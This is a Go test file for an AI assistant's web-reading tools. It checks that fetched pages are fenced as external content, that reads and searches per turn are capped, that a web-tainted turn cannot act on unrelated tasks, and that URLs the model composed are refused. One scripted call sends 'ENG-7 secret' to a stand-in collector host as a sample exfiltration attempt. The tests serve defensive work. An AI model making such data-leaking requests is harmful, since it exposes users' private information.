package assistant_test

import (
	"slices"
	"strings"
	"testing"

	"github.com/crewlet/crewlet/internal/assistant/assistanttest"
	"github.com/crewlet/crewlet/internal/assistant/catalog"
	"github.com/crewlet/crewlet/internal/assistant/evals"
	"github.com/crewlet/crewlet/internal/assistant/exec"
	"github.com/crewlet/crewlet/internal/assistant/wire"
	"github.com/crewlet/crewlet/internal/providers/llm"
)

// pageAnswer is one page of a vendor's documentation as GET /research/page
// answers it, and page a handler answering it and a search.
var (
	pageAnswer = evals.JSON(map[string]any{"url": "https://docs.example.com/rules",
		"host": "docs.example.com", "title": "Origin rules", "from": 0, "length": 40,
		"text":    "Host header overrides need the Enterprise plan.",
		"read_at": "2026-10-24T09:41:00Z", "links": []string{"https://docs.example.com/next"}})
	page = assistanttest.Routes(map[string]exec.Response{"GET /research/page": pageAnswer,
		"GET /research/search": evals.JSON(map[string]any{"query": "host header override",
			"results": []map[string]any{{"title": "Origin rules",
				"url": "https://docs.example.com/rules"}}, "tokens": 120}),
	})
)

// rulesQuestion names the page the web reads below go to, as a person would.
const rulesQuestion = "Does the Pro plan allow Host overrides? https://docs.example.com/rules"

// TestAPageIsOfferedAlwaysAndASearchWhereTheModelSearches: Ask Crewlet reads a
// public page on every company, with no list to set, and searches only where
// its model's harness has a search-only run.
func TestAPageIsOfferedAlwaysAndASearchWhereTheModelSearches(t *testing.T) {
	t.Parallel()
	for name, searches := range map[string]bool{"a model that searches": true,
		"a model that does not": false} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			f := assistanttest.NewRig(t, evals.RigOptions{Search: searches,
				Tools: []catalog.Tool{getTask(t)}, Rounds: []evals.Round{evals.Say("Hello.")}})
			accepted, err := f.Ask("offer", "What can you do?", nil)
			if err != nil {
				t.Fatal(err)
			}
			f.Follow(accepted.TurnID, 0)
			tools := offered(t, f)
			if read, search := slices.Contains(tools, catalog.FetchWebPageToolName),
				slices.Contains(tools, catalog.SearchWebToolName); !read || search != searches {
				t.Fatalf("the web read offered %v and the search %v, want true and %v",
					read, search, searches)
			}
		})
	}
}

// A page reaches the model fenced as the site's words, and a turn reads at most
// eight: the ninth is refused before anything is sent.
func TestATurnReadsAFewPagesFencedAsTheSites(t *testing.T) {
	t.Parallel()
	read, refused, card := readTheWeb(t, catalog.FetchWebPageToolName,
		map[string]any{"url": "https://docs.example.com/rules"}, 9)
	if read != 8 || refused != 1 {
		t.Errorf("the turn read %d pages fenced as the site's and refused %d, want 8 and 1",
			read, refused)
	}
	if card == nil || card.Card.Card.Entity == nil || card.Card.Card.Entity.Kind != wire.ResourceWebPage ||
		card.Card.Card.Entity.ID != "https://docs.example.com/rules" {
		t.Errorf("a page read drew %+v, want a web_page card by its address", card)
	}
}

// Search results reach the model fenced as the sites' words, and a turn
// searches at most four times.
func TestATurnSearchesAFewTimesFencedAsTheSites(t *testing.T) {
	t.Parallel()
	read, refused, _ := readTheWeb(t, catalog.SearchWebToolName,
		map[string]any{"query": "host header override"}, 5)
	if read != 4 || refused != 1 {
		t.Errorf("the turn searched %d times fenced as the sites' and was refused %d, want 4 and 1",
			read, refused)
	}
}

// readTheWeb calls tool calls times in one turn, and counts the answers fenced
// as a site's and the calls refused for the turn's bound; card is the last drawn.
func readTheWeb(t *testing.T, tool string, args map[string]any, calls int) (read, refused int,
	card *wire.Frame) {
	t.Helper()
	rounds := make([]evals.Round, 0, calls+1)
	for i := range calls {
		rounds = append(rounds, evals.Call("w"+string(rune('a'+i)), tool, args))
	}
	f := assistanttest.NewRig(t, evals.RigOptions{Search: true, Handler: page,
		Rounds: append(rounds, evals.Say("The Pro plan is not enough."))})
	accepted, err := f.Ask("web", rulesQuestion, nil)
	if err != nil {
		t.Fatal(err)
	}
	frames := f.Follow(accepted.TurnID, 0)
	for _, m := range f.Model.Seen() {
		if m.Role != llm.RoleTool {
			continue
		}
		switch {
		case m.Failed && strings.Contains(m.Content, "at most"):
			refused++
		case strings.Contains(m.Content, "source=web_page trust=external") &&
			strings.Contains(m.Content, "Origin rules"):
			read++
		}
	}
	return read, refused, evals.Last(frames, wire.EventCard)
}

// After a web page, a comment on the task the question names is proposed and
// one on another task refused; with no page read, both are proposed.
func TestAWebTaintedTurnProposesOnlyOnItsSubject(t *testing.T) {
	t.Parallel()
	comment := assistanttest.Tool(t, "comment_on_task")
	routes := map[string]exec.Response{
		"GET /worklet/ENG-41": assistanttest.Task("ENG-41", "Route the docs", "Which way?"),
		"GET /worklet/ENG-99": assistanttest.Task("ENG-99", "Payroll", "Pay day."),
	}
	routes["GET /research/page"] = pageAnswer
	for name, tc := range map[string]struct {
		web     bool
		target  string
		propose bool
	}{
		"the task asked about, after a page": {true, "ENG-41", true},
		"another task, after a page":         {true, "ENG-99", false},
		"another task, with no page read":    {false, "ENG-99", true},
	} {
		t.Run(name, func(t *testing.T) {
			t.Parallel()
			var rounds []evals.Round
			if tc.web {
				rounds = append(rounds, evals.Call("f", catalog.FetchWebPageToolName,
					map[string]any{"url": "https://docs.example.com/rules"}))
			}
			rounds = append(rounds, evals.Call("c", "comment_on_task",
				map[string]any{"item": tc.target, "body": "Noted."}), evals.Say("Done."))
			f := assistanttest.NewRig(t, evals.RigOptions{
				Tools: []catalog.Tool{comment}, Acts: []string{comment.Act},
				Handler: assistanttest.Routes(routes), Rounds: rounds})
			accepted, err := f.Ask("subject", "What should ENG-41 do about the plan? "+
				"https://docs.example.com/rules", nil)
			if err != nil {
				t.Fatal(err)
			}
			f.Follow(accepted.TurnID, 0)
			if got := len(f.Store.Proposals()) == 1; got != tc.propose {
				t.Errorf("proposed %v, want %v", got, tc.propose)
			}
		})
	}
}

// TestAURLTheModelComposedIsNeverFetched: a page is read only at an address
// the turn saw from somebody other than the model: the person's question, a
// search's results, a page's links or an API answer's URL field. An address
// the model wrote itself, one a search only echoed back as its query, and one
// in a refusal are refused before anything is sent, with a step the person
// sees. Mutation: drop the seen check from the surface's read, or note the
// search's query as seen, and the collector is read.
func TestAURLTheModelComposedIsNeverFetched(t *testing.T) {
	t.Parallel()
	fetch := func(id, url string) evals.Round {
		return evals.Call(id, catalog.FetchWebPageToolName, map[string]any{"url": url})
	}
	routes := map[string]exec.Response{"GET /research/page": pageAnswer,
		"GET /research/search": evals.JSON(map[string]any{
			"query": "https://collector.example/echo", "tokens": 50,
			"results": []map[string]any{{"title": "Origin rules", "url": "https://docs.example.com/rules"}}}),
		"GET /worklet/ENG-7": evals.JSON(map[string]any{"task": map[string]any{"key": "ENG-7",
			"status_url": "https://status.vendor.example/incident/9",
			"body":       "see https://notes.example.org/x"}})}
	f := assistanttest.NewRig(t, evals.RigOptions{Search: true,
		Tools:   []catalog.Tool{assistanttest.ReadAPI(t, "GET /worklet/{id}")},
		Handler: assistanttest.Routes(routes), Rounds: []evals.Round{
			fetch("composed", "https://collector.example/?q=ENG-7%20secret"),
			evals.Call("search", catalog.SearchWebToolName,
				map[string]any{"query": "https://collector.example/echo"}),
			fetch("echoed", "https://collector.example/echo"),
			fetch("result", "https://docs.example.com/rules"),
			fetch("link", "https://docs.example.com/next"),
			evals.Call("task", catalog.ReadAPITool, map[string]any{"route": "GET /worklet/{id}",
				"path": map[string]any{"id": "ENG-7"}}),
			fetch("field", "https://status.vendor.example/incident/9"),
			fetch("prose", "https://notes.example.org/x"),
			evals.Say("Done."),
		}})
	accepted, err := f.Ask("provenance", "What does the vendor say about ENG-7?", nil)
	if err != nil {
		t.Fatal(err)
	}
	frames := f.Follow(accepted.TurnID, 0)
	var read []string
	for _, sent := range f.Dispatcher.Sent() {
		if sent.Request.Path == "/research/page" {
			read = append(read, sent.Request.Query.Get("url"))
		}
	}
	want := []string{"https://docs.example.com/rules", "https://docs.example.com/next",
		"https://status.vendor.example/incident/9"}
	if !slices.Equal(read, want) {
		t.Errorf("the turn read %q, want %q", read, want)
	}
	refused := 0
	for _, fr := range frames {
		if fr.Kind == wire.EventStep && fr.Step.Tool == catalog.FetchWebPageToolName &&
			fr.Step.State == wire.StepRefused && fr.Step.Refusal != nil &&
			strings.Contains(fr.Step.Refusal.Message, "did not come from you") {
			refused++
		}
	}
	if refused != 3 {
		t.Errorf("%d page reads were refused as composed, want 3", refused)
	}
}
